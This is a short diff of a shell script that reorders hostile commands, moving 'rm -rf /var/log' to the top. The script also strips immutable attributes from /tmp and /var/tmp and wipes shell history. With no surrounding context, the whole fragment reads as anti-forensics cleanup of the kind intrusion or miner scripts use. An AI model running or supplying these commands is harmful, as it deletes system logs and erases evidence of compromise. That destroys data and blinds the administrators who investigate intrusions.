@@ -1,5 +1,5 @@
+rm -rf /var/log
 chattr -iua /tmp/
 chattr -iua /var/tmp/
 history -c
 history -w
-rm -rf /var/log
